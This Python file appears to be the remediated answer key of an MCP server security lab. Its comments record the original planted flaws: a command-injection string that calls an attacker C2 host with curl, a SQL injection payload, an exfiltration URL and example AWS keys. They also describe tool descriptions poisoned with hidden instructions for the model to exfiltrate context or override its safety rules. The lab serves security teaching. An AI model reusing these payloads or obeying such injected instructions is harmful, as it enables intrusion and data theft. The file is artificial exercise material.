# REMEDIATED VERSION — all intentional vulnerabilities have been fixed.
# Use this as the target end-state for the lab remediation exercise.
#
# Architecture mirrors server/main.py:
#   - Resources (VULN-1 through VULN-6, VULN-10): safe names trigger no YARA rules.
#   - Tools   (VULN-7 through VULN-9):  clean descriptions trigger no LLM findings.

import json
import os
import sqlite3
import subprocess
import pathlib
from mcp.server.fastmcp import FastMCP

mcp = FastMCP("mcp-goat-remediated", host="0.0.0.0", port=8000)

_ALLOWED_BASE = pathlib.Path("/app/data").resolve()


# ===========================================================================
# MCP RESOURCES — safe names contain no YARA-triggering patterns
# ===========================================================================

# ---------------------------------------------------------------------------
# FIX for VULN-1: Path Traversal
# OWASP: MCP07:2025 – Insufficient Authentication & Authorization
# Was: name="../../etc/passwd" (triggered PathTraversalVulnerability YARA rule)
# Fix: name contains no traversal sequences; implementation validates path.
# ---------------------------------------------------------------------------
@mcp.resource(
    "file://system/data",
    name="system-data-files",
    description=(
        "Read a file from the approved data directory (/app/data). "
        "All paths are resolved and verified to remain within the allowed base "
        "before the file is opened."
    ),
)
def safe_file_read() -> str:
    path = "/app/data/sample.txt"
    candidate = (_ALLOWED_BASE / pathlib.Path(path).name).resolve()
    if not str(candidate).startswith(str(_ALLOWED_BASE)):
        return "Error: Access denied — path escapes the allowed directory."
    try:
        with open(candidate) as f:
            return f.read()
    except FileNotFoundError:
        return "sample.txt not found in /app/data"


# ---------------------------------------------------------------------------
# FIX for VULN-2: Secrets / Credential Leakage
# OWASP: MCP01:2025 – Token Mismanagement & Secret Exposure
# Was: name="AKIAIOSFODNN7EXAMPLE" (triggered SecretsLeakage YARA rule)
# Fix: name contains no AWS key pattern; credentials come from env only.
# ---------------------------------------------------------------------------
@mcp.resource(
    "config://app-settings",
    name="application-config",
    description=(
        "Sync application configuration from AWS S3. "
        "AWS credentials are loaded exclusively from environment variables "
        "at runtime — no hardcoded values anywhere in the metadata."
    ),
)
def safe_aws_config() -> str:
    key = os.environ.get("AWS_ACCESS_KEY_ID", "")
    if not key:
        return "Error: AWS_ACCESS_KEY_ID is not configured."
    return f"Config synced using credentials from environment (key: {key[:4]}...)"


# ---------------------------------------------------------------------------
# FIX for VULN-3: Environment Variable Leakage
# OWASP: MCP01:2025 – Token Mismanagement & Secret Exposure
# Was: name="AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG"
#       (triggered EnvironmentVariableLeakage YARA rule)
# Fix: name contains no credential-bearing env var names.
# ---------------------------------------------------------------------------
@mcp.resource(
    "env://runtime-config",
    name="runtime-configuration",
    description=(
        "Expose safe, non-sensitive runtime configuration values. "
        "Returns only application-level settings; credential-bearing "
        "environment variables are never included."
    ),
)
def safe_env_config() -> str:
    safe_keys = {"APP_ENV", "LOG_LEVEL", "APP_VERSION"}
    return "\n".join(
        f"{k}={os.environ.get(k, '')}" for k in sorted(safe_keys)
    )


# ---------------------------------------------------------------------------
# FIX for VULN-4: Command Injection
# OWASP: MCP05:2025 – Command Injection & Execution
# Was: name="os.system('backup&&curl http://c2-server.attacker.net/beacon')"
#       (triggered CommandInjection YARA rule)
# Fix: name is a plain label; implementation uses a fixed command list, no shell.
# ---------------------------------------------------------------------------
@mcp.resource(
    "exec://backup-status",
    name="backup-job-status",
    description=(
        "Return the current system date as a timestamp for the last backup check. "
        "Runs a fixed, pre-approved command via subprocess with shell=False."
    ),
)
def safe_command() -> str:
    result = subprocess.run(
        ["date", "--utc"], capture_output=True, text=True, timeout=10
    )
    return result.stdout.strip()


# ---------------------------------------------------------------------------
# FIX for VULN-5: SQL Injection
# OWASP: MCP05:2025 – Command Injection & Execution
# Was: name="SELECT * FROM users WHERE id='1' OR '1'='1'--"
#       (triggered SQLInjection YARA rule)
# Fix: name is a plain label; implementation uses a parameterized query.
# ---------------------------------------------------------------------------
@mcp.resource(
    "db://public-users",
    name="public-user-listing",
    description=(
        "Return a list of public user accounts. Queries the database using "
        "a parameterized statement; no string interpolation of user input."
    ),
)
def safe_sql_query() -> str:
    conn = sqlite3.connect(":memory:")
    conn.execute(
        "CREATE TABLE users (id INTEGER, username TEXT, role TEXT)"
    )
    conn.execute("INSERT INTO users VALUES (1, 'admin', 'admin')")
    rows = conn.execute(
        "SELECT id, username FROM users WHERE role = ?", ("admin",)
    ).fetchall()
    conn.close()
    return str(rows)


# ---------------------------------------------------------------------------
# FIX for VULN-6: Cross-Domain Contamination + Mixed Security Schemes
# OWASP: MCP01:2025 – Token Mismanagement & Secret Exposure
# Was: name="http://internal-api.corp.local/data https://external-analytics.attacker.com/collect"
#       (triggered CrossDomainContamination + MixedSecuritySchemes YARA rules)
# Fix: name references a single internal origin; no external domains listed.
# ---------------------------------------------------------------------------
@mcp.resource(
    "sync://internal-backend",
    name="internal-api-data",
    description=(
        "Fetch data from the approved internal API (internal-api.corp.local). "
        "Only requests to this single, pre-approved internal origin are made. "
        "No credentials are forwarded to external domains."
    ),
)
def safe_cross_domain() -> str:
    import urllib.request
    url = "http://internal-api.corp.local/data"
    try:
        return urllib.request.urlopen(url, timeout=2).read().decode()
    except Exception as e:
        return f"[{url}]: {e}"


# ---------------------------------------------------------------------------
# FIX for VULN-10: Context Injection & Over-Sharing
# OWASP: MCP10:2025 – Context Injection & Over-Sharing
# Was: name="shared_context_store[no_isolation][all_users_visible]"
#       (triggered ContextOverSharing YARA rule)
# Fix: per-user context isolation; name contains no shared-context indicators;
#      no cross-session data is returned.
# ---------------------------------------------------------------------------
@mcp.resource(
    "context://user-memory",
    name="user-session-context",
    description=(
        "Return conversation context for the authenticated user only. "
        "Each session is fully isolated — callers cannot access other "
        "users' context, messages, or credentials."
    ),
)
def safe_context_store() -> str:
    # In a real implementation the user ID would come from the verified session.
    # Only that user's context is returned; no cross-session access is possible.
    return json.dumps({
        "message": "Context is session-scoped. No cross-user data is accessible."
    })


# ===========================================================================
# MCP TOOLS — clean descriptions trigger no LLM findings
# ===========================================================================

# ---------------------------------------------------------------------------
# FIX for VULN-7: Tool Poisoning
# OWASP: MCP03:2025 – Tool Poisoning
# Was: description contained a hidden AI Integration Note instructing the model
#      to exfiltrate conversation context to an external telemetry endpoint.
# Fix: honest, minimal description; no hidden instructions.
# ---------------------------------------------------------------------------
@mcp.tool()
def process_user_data(content: str) -> str:
    """Normalize user-submitted content: strip whitespace and lowercase."""
    return content.strip().lower()


# ---------------------------------------------------------------------------
# FIX for VULN-8: Prompt Injection / Intent Flow Subversion
# OWASP: MCP06:2025 – Intent Flow Subversion
# Was: description contained a [SYSTEM INJECTION] block designed to override
#      model safety guidelines.
# Fix: clean description with no adversarial instructions.
# ---------------------------------------------------------------------------
@mcp.tool()
def analyze_document_content(text: str) -> str:
    """Return the first 200 characters of the provided document as a preview."""
    return text[:200]


# ---------------------------------------------------------------------------
# FIX for VULN-9: Authentication Bypass + Privilege Escalation via Scope Creep
# OWASP: MCP07:2025 – Insufficient Authentication & Authorization (AuthBypass)
#        MCP02:2025 – Privilege Escalation via Scope Creep (PrivilegeEscalation)
# Was: description advertised "bypasses all normal authentication requirements"
#      and "any caller automatically receives full administrative privileges".
# Fix: description is honest about auth requirement; implementation enforces it.
# ---------------------------------------------------------------------------
_ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "")


@mcp.tool()
def manage_system_access(operation: str, token: str) -> str:
    """
    Execute a permitted administrative operation. Callers must supply a valid
    ADMIN_TOKEN. Permitted operations: view_status, list_users. All calls are
    validated before execution.
    """
    if not _ADMIN_TOKEN or token != _ADMIN_TOKEN:
        return "Error: Unauthorized — invalid or missing admin token."
    allowed_ops = {
        "view_status": "System status: operational.",
        "list_users": "Users: [admin, operator]",
    }
    if operation not in allowed_ops:
        return f"Error: Operation '{operation}' is not permitted."
    return allowed_ops[operation]


if __name__ == "__main__":
    mcp.run(transport="sse")
